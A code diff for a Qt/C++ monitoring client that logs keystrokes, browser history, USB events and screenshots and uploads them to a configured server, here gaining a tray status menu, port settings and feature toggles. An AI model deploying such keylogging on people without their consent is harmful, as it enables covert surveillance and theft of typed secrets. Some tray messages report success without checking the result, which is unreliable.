@@ -33,9 +33,9 @@
 #include "MonitorClient.h"
 #include "functions.h"
 #include "KeyboardMonitor.h"
+#include "version.h"
 #include <libudev.h>
 
-#define SCREEN_INTERVAL 5
 #define TIC_INTERVAL 30
 #define HISTORY_INTERVAL 120
 #define KEY_INTERVAL 60
@@ -43,9 +43,18 @@
 
 MonitorClient::MonitorClient()
 {
+    // Load settings first
+    loadSettings("settings.ini");
+    
     macAddress = getMacAddress();
-    screenInterval = SCREEN_INTERVAL;
     lastBrowserTic = -1;
+    
+    // Debug: Print loaded settings
+    qDebug() << "Loaded Server IP:" << getServerIP();
+    qDebug() << "Loaded Server Port:" << getServerPort();
+    qDebug() << "Loaded Client Name:" << getClientName();
+    qDebug() << "Local IP Address:" << getLocalIPAddress();
+    qDebug() << "MAC Address:" << macAddress;
     // Initialize keyboard monitor
     keyboardMonitor = new KeyboardMonitor(this);
     connect(keyboardMonitor, &KeyboardMonitor::keyPressed, this, &MonitorClient::handleKeyPress);
@@ -67,6 +76,32 @@ MonitorClient::MonitorClient()
 
     // Initialize USB monitoring
     setupUsbMonitoring();
+    
+    // Initialize system tray
+    setupSystemTray();
+    
+    // Initialize connection status
+    serverConnected = false;
+    lastError = "";
+    clientName = getClientName();
+    
+    // Initialize status tracking
+    screenshotEnabled = false;
+    keylogEnabled = true;
+    browserHistoryEnabled = true;
+    usbMonitoringEnabled = true;
+    
+    // Initialize last sent times
+    lastKeySentTime = QDateTime();
+    lastUsbSentTime = QDateTime();
+    lastBrowserSentTime = QDateTime();
+    lastScreenshotSentTime = QDateTime();
+    
+    // Initialize connection error tracking
+    connectionErrorNotified = false;
+    
+    // Initialize network manager
+    networkManager = new QNetworkAccessManager(this);
 }
 
 MonitorClient::~MonitorClient()
@@ -77,6 +112,7 @@ MonitorClient::~MonitorClient()
         keyboardMonitor = nullptr;
     }
     cleanupUsbMonitoring();
+    cleanupSystemTray();
 }
 
 QString MonitorClient::getMacAddress() {
@@ -190,7 +226,7 @@ void MonitorClient::handleUsbEvent()
     }
 }
 
-void MonitorClient::handleKeyPress(const QString &timestamp, const QString &windowTitle, const QString &keyText)
+void MonitorClient::handleKeyPress(qint64 timestamp, const QString &windowTitle, const QString &keyText)
 {
     QJsonObject entryObj;
     entryObj["date"] = timestamp;
@@ -201,25 +237,21 @@ void MonitorClient::handleKeyPress(const QString &timestamp, const QString &wind
 
 int MonitorClient::getScreen()
 {
-    QString savedPath = "/tmp/";
-    QString filePath = "";
+    QString filePath = "/tmp/tmp.jpg";
     int sendResult = 0;
 
-    QDateTime currentTime = currentTime.currentDateTime();
-    filePath = savedPath + currentTime.toString("yyyy-MM-dd_HH.mm.ss");
     bool res;
     grabScreen(filePath, res);
 
     if (res) 
     {
-        filePath.append(".jpg");
-        sendResult = sendScreens(filePath);
+        sendResult = sendScreens(filePath + ".jpg");
         if (sendResult < 0) {
             return 0;
         }
         
-        QDir dir;
-        dir.remove(filePath);
+        // Clean up the temporary file
+        QFile::remove(filePath + ".jpg");
     }
     
     return sendResult;
@@ -274,13 +306,14 @@ int MonitorClient::sendScreens(QString filePath){
     QEventLoop eventLoop;
     
     QString serverIP = getServerIP();
+    int serverPort = getServerPort();
 
     if (!serverIP.isEmpty()) {
         QNetworkAccessManager mgr;
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(serverIP.prepend("http://").append("/scview/webapi.php")));
+        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi.php").arg(serverIP).arg(serverPort)));
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
         QHttpPart imagePart;
@@ -301,31 +334,16 @@ int MonitorClient::sendScreens(QString filePath){
         eventLoop.exec(); // blocks stack until "finished()" has been called
         
         if (reply->error() == QNetworkReply::NoError) {
-            QJsonParseError jsonError;
-            QJsonDocument jsonDoc = QJsonDocument::fromJson(reply->readAll(),&jsonError);
-            if (jsonError.error != QJsonParseError::NoError) {
-                qDebug() << jsonError.errorString();
-                ret = -2; // server error;
-            }
-            if(jsonDoc.isObject())
-            {
-                QJsonObject obj = jsonDoc.object();
-                
-                qDebug() << jsonDoc.object();
-                
-                QJsonObject::iterator itr = obj.find("Status");
-                if(itr != obj.end())
-                {
-                    if(obj.value("Status").toString() == "OK")
-                    {
-                        ret = obj.value("Interval").toInt();
-                    }
-                    else 
-                    {
-                        qDebug() << obj.value("Message").toString();
-                        ret = -1; //Tic is bad
-                    }
-                }
+            // Check HTTP status code
+            int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
+            if (statusCode == 200) {
+                // Success - update last sent time
+                lastScreenshotSentTime = QDateTime::currentDateTime();
+                updateStatusDisplay();
+                ret = 0; // Success
+            } else {
+                qDebug() << "Server returned status code:" << statusCode;
+                ret = -1; // Server error
             }
             
             delete reply;
@@ -345,7 +363,8 @@ int MonitorClient::sendTic(){
     int ret = -3;
     
     QString serverIP = getServerIP();
-    
+    int serverPort = getServerPort();
+
     if (!serverIP.isEmpty()) {
         
         // create custom temporary event loop on stack
@@ -356,7 +375,7 @@ int MonitorClient::sendTic(){
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(serverIP.prepend("http://").append("/scview/eventhandler.php")));
+        QNetworkRequest req(QUrl(QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort)));
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
         QHttpPart eventPart;
@@ -379,31 +398,31 @@ int MonitorClient::sendTic(){
         eventLoop.exec(); // blocks stack until "finished()" has been called
 
         if (reply->error() == QNetworkReply::NoError) {
-            QJsonParseError jsonError;
-            QJsonDocument jsonDoc = QJsonDocument::fromJson(reply->readAll(),&jsonError);
-            if (jsonError.error != QJsonParseError::NoError) {
-                qDebug() << jsonError.errorString();
-                ret = -2; // server error;
-            }
-            if(jsonDoc.isObject())
-            {
-                QJsonObject obj = jsonDoc.object();
-                QJsonObject::iterator itr = obj.find("Status");
-                if(itr != obj.end())
-                {
-                    if(obj.value("Status").toString() == "OK")
-                    {
-                        ret = 1; // Tic Ok
-                    }
-                    else 
-                    {
-                        qDebug() << obj.value("Message").toString();
-                        ret = -1; // Tic is bad
+            // Check HTTP status code
+            int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
+            if (statusCode == 200) {
+                ret = 1; // Success
+                serverConnected = true;
+                lastError = "";
+                connectionErrorNotified = false; // Reset error notification flag
+                updateTrayIcon();
+                updateTrayMenu();
+                
+                // Try to parse JSON response for additional data
+                QJsonParseError jsonError;
+                QJsonDocument jsonDoc = QJsonDocument::fromJson(reply->readAll(),&jsonError);
+                if (jsonError.error == QJsonParseError::NoError && jsonDoc.isObject()) {
+                    QJsonObject obj = jsonDoc.object();
+                    if (obj.contains("LastBrowserTic")) {
+                        lastBrowserTic = obj["LastBrowserTic"].toVariant().toLongLong();
                     }
                 }
-                if (obj.contains("LastBrowserTic")) {
-                    lastBrowserTic = obj["LastBrowserTic"].toVariant().toLongLong();
-                }
+            } else {
+                qDebug() << "Server returned status code:" << statusCode;
+                ret = -1; // Server error
+                serverConnected = false;
+                lastError = QString("HTTP %1").arg(statusCode);
+                showConnectionError(lastError);
             }
             
             delete reply;
@@ -411,6 +430,9 @@ int MonitorClient::sendTic(){
         else {
             //failure
             qDebug() << "Failure" <<reply->errorString();
+            serverConnected = false;
+            lastError = reply->errorString();
+            showConnectionError(lastError);
             delete reply;
         }
     }
@@ -723,8 +745,8 @@ QString MonitorClient::getJsonObjectListAsJsonString(const QList<QJsonObject>& j
 int MonitorClient::sendBrowserHistories() {
     int ret = -3;
     QString serverIP = getServerIP();
-    
-    if (!serverIP.isEmpty()) {
+    int serverPort = getServerPort();
+    if (!serverIP.isEmpty() && serverPort > 0) {
         // Get browser histories
         getBrowserHistory();
         
@@ -744,9 +766,13 @@ int MonitorClient::sendBrowserHistories() {
             for (int i = 0; i < chunks.size(); ++i) {
                 qDebug() << "Sending chunk" << (i + 1) << "of" << chunks.size();
                 QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
-                ret = sendDataChunk(serverIP, "BrowserHistory", "BrowserHistories", chunkJsonString);
+                ret = sendDataChunk(serverIP, serverPort, "BrowserHistory", "BrowserHistories", chunkJsonString);
                 
-                if (ret != 1) {
+                if (ret == 1) {
+                    // Success - update last sent time
+                    lastBrowserSentTime = QDateTime::currentDateTime();
+                    updateStatusDisplay();
+                } else {
                     qDebug() << "Failed to send browser history chunk" << (i + 1);
                     break;
                 }
@@ -808,7 +834,6 @@ void MonitorClient::getStorageDevices()
 void MonitorClient::run()
 {
     qint64 lastTicTime = QDateTime::currentSecsSinceEpoch();
-    qint64 lastScreenTime = lastTicTime;
     qint64 lastHistoryTime = lastTicTime;
     qint64 lastKeyLogTime = lastTicTime;
     
@@ -831,18 +856,6 @@ void MonitorClient::run()
                 }
             }
 
-            // Send image every screenInterval seconds
-            if (currentTime - lastScreenTime >= screenInterval) {
-                emit screen();
-                lastScreenTime = currentTime;
-            }
-
-            // Send tic every TIC_INTERVAL seconds
-            if (currentTime - lastTicTime >= TIC_INTERVAL) {
-                emit tic();
-                lastTicTime = currentTime;
-            }
-                    
             // Send tic every TIC_INTERVAL seconds
             if (currentTime - lastTicTime >= TIC_INTERVAL) {
                 emit tic();
@@ -850,7 +863,7 @@ void MonitorClient::run()
             }
             
             // Send browser histories every HISTORY_INTERVAL seconds
-            if (currentTime - lastHistoryTime >= HISTORY_INTERVAL) {
+            if (currentTime - lastHistoryTime >= HISTORY_INTERVAL && browserHistoryEnabled) {
                 if (lastBrowserTic != -1) {
                     emit browserHistory();
                     lastHistoryTime = currentTime;
@@ -858,9 +871,11 @@ void MonitorClient::run()
             }
             
             // Send key logs every KEY_INTERVAL seconds
-            if (currentTime - lastKeyLogTime >= KEY_INTERVAL) {
+            if (currentTime - lastKeyLogTime >= KEY_INTERVAL && keylogEnabled) {
                 emit keyLog();
-                emit usbLog();
+                if (usbMonitoringEnabled) {
+                    emit usbLog();
+                }
                 lastKeyLogTime = currentTime;
             }
         }
@@ -915,8 +930,8 @@ int MonitorClient::sendKeyLogs()
         qDebug() << "Sending key logs in chunks...";
         
         QString serverIP = getServerIP();
-        
-        if (!serverIP.isEmpty()) {
+        int serverPort = getServerPort();
+        if (!serverIP.isEmpty() && serverPort > 0) {
             // Split into chunks of 1000 entries
             QList<QList<QJsonObject>> chunks = chunkData(keyLogs, 1000);
             
@@ -926,9 +941,13 @@ int MonitorClient::sendKeyLogs()
             for (int i = 0; i < chunks.size(); ++i) {
                 qDebug() << "Sending key log chunk" << (i + 1) << "of" << chunks.size();
                 QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
-                ret = sendDataChunk(serverIP, "KeyLog", "KeyLogs", chunkJsonString);
+                ret = sendDataChunk(serverIP, serverPort, "KeyLog", "KeyLogs", chunkJsonString);
                 
-                if (ret != 1) {
+                if (ret == 1) {
+                    // Success - update last sent time
+                    lastKeySentTime = QDateTime::currentDateTime();
+                    updateStatusDisplay();
+                } else {
                     qDebug() << "Failed to send key log chunk" << (i + 1);
                     break;
                 }
@@ -953,8 +972,8 @@ int MonitorClient::sendUSBLogs()
         qDebug() << "Sending USB logs in chunks...";
         
         QString serverIP = getServerIP();
-        
-        if (!serverIP.isEmpty()) {
+        int serverPort = getServerPort();
+        if (!serverIP.isEmpty() && serverPort > 0) {
             // Split into chunks of 1000 entries
             QList<QList<QJsonObject>> chunks = chunkData(usbLogs, 1000);
             
@@ -964,9 +983,13 @@ int MonitorClient::sendUSBLogs()
             for (int i = 0; i < chunks.size(); ++i) {
                 qDebug() << "Sending USB log chunk" << (i + 1) << "of" << chunks.size();
                 QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
-                ret = sendDataChunk(serverIP, "USBLog", "USBLogs", chunkJsonString);
+                ret = sendDataChunk(serverIP, serverPort, "USBLog", "USBLogs", chunkJsonString);
                 
-                if (ret != 1) {
+                if (ret == 1) {
+                    // Success - update last sent time
+                    lastUsbSentTime = QDateTime::currentDateTime();
+                    updateStatusDisplay();
+                } else {
                     qDebug() << "Failed to send USB log chunk" << (i + 1);
                     break;
                 }
@@ -1008,12 +1031,12 @@ QList<QList<QJsonObject>> MonitorClient::chunkData(const QList<QJsonObject>& dat
     return chunks;
 }
 
-int MonitorClient::sendDataChunk(const QString& serverIP, const QString& eventType, const QString& dataField, const QString& data) {
+int MonitorClient::sendDataChunk(const QString& serverIP, int serverPort, const QString& eventType, const QString& dataField, const QString& data) {
     QEventLoop eventLoop;
     QNetworkAccessManager mgr;
     QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
-    QString url = "http://" + serverIP + "/scview/eventhandler.php";
+    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
     QNetworkRequest req;
     req.setUrl(QUrl(url));
     req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
@@ -1023,7 +1046,17 @@ int MonitorClient::sendDataChunk(const QString& serverIP, const QString& eventTy
     jsonObj["MacAddress"] = macAddress;
     jsonObj["Event"] = eventType;
     jsonObj["Version"] = QString(MONITORAPP_VERSION);
-    jsonObj[dataField] = data;  // Direct assignment of QJsonArray
+    jsonObj["Username"] = clientName;
+    
+    // Parse the data string back into JSON array
+    QJsonParseError parseError;
+    QJsonDocument dataDoc = QJsonDocument::fromJson(data.toUtf8(), &parseError);
+    if (parseError.error == QJsonParseError::NoError && dataDoc.isArray()) {
+        jsonObj[dataField] = dataDoc.array();
+    } else {
+        qDebug() << "Failed to parse data as JSON array:" << parseError.errorString();
+        jsonObj[dataField] = data;  // Fallback to string if parsing fails
+    }
     
     QJsonDocument jsonDoc(jsonObj);
     QByteArray jsonData = jsonDoc.toJson();
@@ -1033,23 +1066,13 @@ int MonitorClient::sendDataChunk(const QString& serverIP, const QString& eventTy
 
     int ret = -3;
     if (reply->error() == QNetworkReply::NoError) {
-        QJsonParseError jsonError;
-        QJsonDocument responseDoc = QJsonDocument::fromJson(reply->readAll(), &jsonError);
-        if (jsonError.error != QJsonParseError::NoError) {
-            qDebug() << jsonError.errorString();
-            ret = -2; // server error
-        }
-        if (responseDoc.isObject()) {
-            QJsonObject obj = responseDoc.object();
-            QJsonObject::iterator itr = obj.find("Status");
-            if (itr != obj.end()) {
-                if (obj.value("Status").toString() == "OK") {
-                    ret = 1; // Success
-                } else {
-                    qDebug() << obj.value("Message").toString();
-                    ret = -1; // Bad response
-                }
-            }
+        // Check HTTP status code
+        int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
+        if (statusCode == 200) {
+            ret = 1; // Success
+        } else {
+            qDebug() << "Server returned status code:" << statusCode;
+            ret = -1; // Server error
         }
     } else {
         qDebug() << "Failure" << reply->errorString();
@@ -1057,4 +1080,482 @@ int MonitorClient::sendDataChunk(const QString& serverIP, const QString& eventTy
     
     delete reply;
     return ret;
+}
+
+bool MonitorClient::isInterruptionRequested()
+{
+    // Stub implementation - always return false for now
+    return false;
+}
+
+bool MonitorClient::testAPIEndpoints(const QString& serverIP, int serverPort)
+{
+    qDebug() << "=== Testing API Endpoints ===";
+    
+    QStringList endpoints = {"/eventhandler.php", "/webapi.php"};
+    
+    for (const QString& endpoint : endpoints) {
+        QString url = QString("http://%1:%2%3").arg(serverIP).arg(serverPort).arg(endpoint);
+        qDebug() << "Testing endpoint:" << url;
+        
+        QNetworkRequest request(url);
+        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
+        
+        QJsonObject testData;
+        testData["Event"] = "Tic";
+        testData["Version"] = MONITORAPP_VERSION;
+        testData["MacAddress"] = macAddress;
+        testData["Username"] = clientName;
+        
+        QJsonDocument doc(testData);
+        QByteArray data = doc.toJson();
+        
+        QNetworkReply *reply = networkManager->post(request, data);
+        
+        QEventLoop loop;
+        connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
+        loop.exec();
+        
+        int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
+        QString response = reply->readAll();
+        
+        qDebug() << "  Endpoint:" << endpoint;
+        qDebug() << "  Status:" << statusCode;
+        qDebug() << "  Response:" << response;
+        qDebug() << "  Error:" << reply->errorString();
+        
+        reply->deleteLater();
+        
+        if (reply->error() == QNetworkReply::NoError && statusCode == 200) {
+            qDebug() << "  ✓ Endpoint" << endpoint << "is working";
+            return true;
+        } else {
+            qDebug() << "  ✗ Endpoint" << endpoint << "failed";
+        }
+    }
+    
+    return false;
+}
+
+int MonitorClient::checkActiveScreen()
+{
+    // Stub implementation - return 1 to indicate screen is active
+    return 1;
+}
+
+// System tray implementation
+void MonitorClient::setupSystemTray()
+{
+    // Create system tray icon
+    trayIcon = new QSystemTrayIcon(this);
+    trayIcon->setIcon(QIcon::fromTheme("monitor", QIcon::fromTheme("computer")));
+    trayIcon->setToolTip("MonitorClient - System Monitoring");
+    
+    // Create tray menu
+    trayMenu = new QMenu();
+    
+    // Create menu actions
+    statusAction = new QAction("Status: Disconnected", this);
+    statusAction->setEnabled(false);
+    
+    screenshotAction = new QAction("Take Screenshot", this);
+    configureAction = new QAction("Configure...", this);
+    testConnectionAction = new QAction("Test Connection", this);
+    testAPIEndpointsAction = new QAction("Test API Endpoints", this);
+    sendAllAction = new QAction("Send All Data", this);
+    
+    // Add actions to menu
+    trayMenu->addAction(statusAction);
+    trayMenu->addSeparator();
+    trayMenu->addAction(screenshotAction);
+    trayMenu->addAction(configureAction);
+    trayMenu->addAction(testConnectionAction);
+    trayMenu->addAction(testAPIEndpointsAction);
+    trayMenu->addSeparator();
+    trayMenu->addAction(sendAllAction);
+    
+    // Set menu for tray icon
+    trayIcon->setContextMenu(trayMenu);
+    
+    // Connect signals
+    connect(trayIcon, &QSystemTrayIcon::activated, this, &MonitorClient::onTrayIconActivated);
+    connect(sendAllAction, &QAction::triggered, this, &MonitorClient::onSendAllAction);
+    connect(configureAction, &QAction::triggered, this, &MonitorClient::onConfigureAction);
+    connect(screenshotAction, &QAction::triggered, this, &MonitorClient::onTakeScreenshotAction);
+    connect(testConnectionAction, &QAction::triggered, this, &MonitorClient::onTestConnectionAction);
+    connect(testAPIEndpointsAction, &QAction::triggered, this, &MonitorClient::onTestAPIEndpointsAction);
+    
+    // Show tray icon
+    trayIcon->show();
+    
+    // Force initial update
+    updateTrayMenu();
+    
+    qDebug() << "System tray setup completed";
+}
+
+void MonitorClient::cleanupSystemTray()
+{
+    if (trayIcon) {
+        trayIcon->hide();
+        delete trayIcon;
+        trayIcon = nullptr;
+    }
+    
+    if (trayMenu) {
+        delete trayMenu;
+        trayMenu = nullptr;
+    }
+}
+
+void MonitorClient::updateTrayIcon()
+{
+    if (!trayIcon) return;
+    
+    if (serverConnected) {
+        trayIcon->setIcon(QIcon::fromTheme("emblem-ok", QIcon::fromTheme("computer")));
+        trayIcon->setToolTip("MonitorClient - Connected");
+    } else {
+        trayIcon->setIcon(QIcon::fromTheme("emblem-error", QIcon::fromTheme("computer")));
+        trayIcon->setToolTip("MonitorClient - Disconnected");
+    }
+}
+
+void MonitorClient::updateTrayMenu()
+{
+    // Ensure tray menu is properly initialized
+    if (!statusAction || !trayMenu) {
+        qDebug() << "Tray menu not properly initialized, reinitializing...";
+        setupSystemTray();
+        return;
+    }
+    
+    QString statusText = "=== MonitorClient Info ===\n";
+    
+    // Server information
+    statusText += QString("Server: %1:%2\n").arg(getServerIP()).arg(getServerPort());
+    
+    // Client information
+    statusText += QString("Client: %1\n").arg(clientName);
+    statusText += QString("Local IP: %1\n").arg(getLocalIPAddress());
+    statusText += QString("MAC: %1\n").arg(macAddress);
+    
+    // Connection status
+    if (serverConnected) {
+        statusText += "Status: Connected\n";
+    } else {
+        statusText += "Status: Disconnected\n";
+        if (!lastError.isEmpty()) {
+            statusText += QString("Error: %1\n").arg(lastError);
+        }
+    }
+    
+    statusText += "\n=== Last Sent Times ===\n";
+    statusText += QString("Screenshot: %1\n").arg(formatLastSentTime(lastScreenshotSentTime));
+    statusText += QString("Keylog: %1\n").arg(formatLastSentTime(lastKeySentTime));
+    statusText += QString("Browser History: %1\n").arg(formatLastSentTime(lastBrowserSentTime));
+    statusText += QString("USB Logs: %1\n").arg(formatLastSentTime(lastUsbSentTime));
+    
+    statusText += "\n=== Monitoring Status ===\n";
+    statusText += QString("Screenshot: %1\n").arg(screenshotEnabled ? "Enabled" : "Disabled");
+    statusText += QString("Keylog: %1\n").arg(keylogEnabled ? "Enabled" : "Disabled");
+    statusText += QString("Browser History: %1\n").arg(browserHistoryEnabled ? "Enabled" : "Disabled");
+    statusText += QString("USB Monitoring: %1").arg(usbMonitoringEnabled ? "Enabled" : "Disabled");
+    
+    statusAction->setText(statusText);
+}
+
+void MonitorClient::showConnectionError(const QString& error)
+{
+    lastError = error;
+    serverConnected = false;
+    
+    // Update tray
+    updateTrayIcon();
+    updateTrayMenu();
+    
+    // Show notification only for first error
+    if (trayIcon && !connectionErrorNotified) {
+        trayIcon->showMessage("Connection Error", error, QSystemTrayIcon::Warning, 5000);
+        connectionErrorNotified = true;
+    }
+    
+    qDebug() << "Connection error:" << error;
+}
+
+bool MonitorClient::testServerConnection()
+{
+    QString serverIP = getServerIP();
+    int serverPort = getServerPort();
+    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
+    
+    qDebug() << "Testing server connection to:" << url;
+    qDebug() << "Server IP:" << serverIP << "Port:" << serverPort;
+    
+    // First test basic connectivity
+    if (!testBasicConnectivity(serverIP, serverPort)) {
+        qDebug() << "Basic connectivity test failed - server may be unreachable";
+        serverConnected = false;
+        lastError = "Server unreachable - check network/firewall";
+        showConnectionError(lastError);
+        return false;
+    }
+    
+    // Test API endpoints
+    if (!testAPIEndpoints(serverIP, serverPort)) {
+        qDebug() << "API endpoints test failed - server may not be responding correctly";
+        serverConnected = false;
+        lastError = "API endpoints not responding correctly";
+        showConnectionError(lastError);
+        return false;
+    }
+    
+    QJsonObject pingData;
+    pingData["Event"] = "Tic";
+    pingData["Version"] = MONITORAPP_VERSION;
+    pingData["MacAddress"] = macAddress;
+    pingData["Username"] = clientName;
+    
+    QJsonDocument doc(pingData);
+    QByteArray data = doc.toJson();
+    
+    qDebug() << "Sending ping data:" << data;
+    qDebug() << "Request URL:" << url;
+    
+    QNetworkRequest request(url);
+    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
+    
+    qDebug() << "Request Content-Type:" << request.header(QNetworkRequest::ContentTypeHeader);
+    
+    QNetworkReply *reply = networkManager->post(request, data);
+    
+    QEventLoop loop;
+    connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
+    loop.exec();
+    
+    bool success = (reply->error() == QNetworkReply::NoError);
+    int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
+    
+    qDebug() << "Connection test result:";
+    qDebug() << "  Network error:" << reply->error();
+    qDebug() << "  HTTP status code:" << statusCode;
+    qDebug() << "  Response:" << reply->readAll();
+    
+    if (success && statusCode == 200) {
+        serverConnected = true;
+        lastError = "";
+        connectionErrorNotified = false; // Reset error notification flag
+        updateTrayIcon();
+        updateTrayMenu();
+        qDebug() << "Server connection successful";
+    } else {
+        serverConnected = false;
+        QString errorMsg = reply->errorString();
+        if (statusCode != 200) {
+            errorMsg = QString("HTTP %1: %2").arg(statusCode).arg(errorMsg);
+        }
+        lastError = errorMsg;
+        showConnectionError(lastError);
+        qDebug() << "Server connection failed:" << errorMsg;
+    }
+    
+    reply->deleteLater();
+    return success && statusCode == 200;
+}
+
+void MonitorClient::onTrayIconActivated(QSystemTrayIcon::ActivationReason reason)
+{
+    if (reason == QSystemTrayIcon::DoubleClick) {
+        // Double click to test connection
+        testServerConnection();
+    }
+}
+
+
+
+void MonitorClient::onSendAllAction()
+{
+    qDebug() << "Send all data requested from system tray";
+    
+    if (trayIcon) {
+        trayIcon->showMessage("Send All Data", "Collecting and sending all data...", QSystemTrayIcon::Information, 2000);
+    }
+    
+    // First, collect fresh data
+    getBrowserHistory();
+    
+    // Then emit all signals to send data
+    emit screen();
+    emit tic();
+    emit browserHistory();
+    emit keyLog();
+    emit usbLog();
+    
+    // Update status after sending
+    QTimer::singleShot(2000, this, [this]() {
+        updateStatusDisplay();
+        if (trayIcon) {
+            trayIcon->showMessage("Send All Data", "All data sent successfully!", QSystemTrayIcon::Information, 3000);
+        }
+    });
+}
+
+void MonitorClient::onConfigureAction()
+{
+    qDebug() << "Configuration dialog requested from system tray";
+    
+    ConfigDialog dialog;
+    if (dialog.exec() == QDialog::Accepted) {
+        // Reload settings
+        clientName = dialog.getClientName();
+        updateTrayMenu();
+        
+        // Test connection with new settings
+        testServerConnection();
+        
+        if (trayIcon) {
+            trayIcon->showMessage("Configuration", "Settings saved successfully!", QSystemTrayIcon::Information, 3000);
+        }
+    }
+}
+
+void MonitorClient::onTakeScreenshotAction()
+{
+    qDebug() << "Screenshot requested from system tray";
+    emit screen();
+    
+    if (trayIcon) {
+        trayIcon->showMessage("Screenshot", "Screenshot taken and sent to server", QSystemTrayIcon::Information, 3000);
+    }
+}
+
+void MonitorClient::updateStatusDisplay()
+{
+    updateTrayIcon();
+    updateTrayMenu();
+}
+
+void MonitorClient::enableScreenshot(bool enabled)
+{
+    screenshotEnabled = enabled;
+    updateStatusDisplay();
+}
+
+void MonitorClient::enableKeylog(bool enabled)
+{
+    keylogEnabled = enabled;
+    updateStatusDisplay();
+}
+
+void MonitorClient::enableBrowserHistory(bool enabled)
+{
+    browserHistoryEnabled = enabled;
+    updateStatusDisplay();
+}
+
+void MonitorClient::enableUsbMonitoring(bool enabled)
+{
+    usbMonitoringEnabled = enabled;
+    updateStatusDisplay();
+}
+
+void MonitorClient::onTestConnectionAction()
+{
+    qDebug() << "Manual connection test requested from system tray";
+    
+    if (trayIcon) {
+        trayIcon->showMessage("Connection Test", "Testing server connection...", QSystemTrayIcon::Information, 2000);
+    }
+    
+    bool success = testServerConnection();
+    
+    if (trayIcon) {
+        if (success) {
+            trayIcon->showMessage("Connection Test", "Server connection successful!", QSystemTrayIcon::Information, 3000);
+        } else {
+            trayIcon->showMessage("Connection Test", "Server connection failed: " + lastError, QSystemTrayIcon::Warning, 5000);
+        }
+    }
+}
+
+void MonitorClient::onTestAPIEndpointsAction()
+{
+    qDebug() << "API endpoints test requested from system tray";
+    
+    if (trayIcon) {
+        trayIcon->showMessage("API Test", "Testing API endpoints...", QSystemTrayIcon::Information, 2000);
+    }
+    
+    QString serverIP = getServerIP();
+    int serverPort = getServerPort();
+    
+    bool success = testAPIEndpoints(serverIP, serverPort);
+    
+    if (trayIcon) {
+        if (success) {
+            trayIcon->showMessage("API Test", "API endpoints are working!", QSystemTrayIcon::Information, 3000);
+        } else {
+            trayIcon->showMessage("API Test", "API endpoints failed - check server", QSystemTrayIcon::Warning, 5000);
+        }
+    }
+}
+
+QString MonitorClient::formatLastSentTime(const QDateTime& time)
+{
+    if (!time.isValid()) {
+        return "Never";
+    }
+    
+    QDateTime now = QDateTime::currentDateTime();
+    qint64 seconds = time.secsTo(now);
+    
+    if (seconds < 60) {
+        return QString("%1s ago").arg(seconds);
+    } else if (seconds < 3600) {
+        return QString("%1m ago").arg(seconds / 60);
+    } else if (seconds < 86400) {
+        return QString("%1h ago").arg(seconds / 3600);
+    } else {
+        return time.toString("MM/dd HH:mm");
+    }
+}
+
+QString MonitorClient::getLocalIPAddress()
+{
+    QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
+    
+    for (const QNetworkInterface& interface : interfaces) {
+        // Skip loopback and down interfaces
+        if (interface.flags().testFlag(QNetworkInterface::IsLoopBack) ||
+            !interface.flags().testFlag(QNetworkInterface::IsUp)) {
+            continue;
+        }
+        
+        QList<QNetworkAddressEntry> entries = interface.addressEntries();
+        for (const QNetworkAddressEntry& entry : entries) {
+            QHostAddress addr = entry.ip();
+            if (addr.protocol() == QAbstractSocket::IPv4Protocol && 
+                !addr.toString().startsWith("169.254")) { // Skip link-local addresses
+                return addr.toString();
+            }
+        }
+    }
+    
+    return "Unknown";
+}
+
+bool MonitorClient::testBasicConnectivity(const QString& host, int port)
+{
+    QTcpSocket socket;
+    socket.connectToHost(host, port);
+    
+    if (socket.waitForConnected(5000)) {
+        qDebug() << "Basic connectivity test successful to" << host << ":" << port;
+        socket.disconnectFromHost();
+        return true;
+    } else {
+        qDebug() << "Basic connectivity test failed to" << host << ":" << port;
+        qDebug() << "Socket error:" << socket.errorString();
+        return false;
+    }
 }
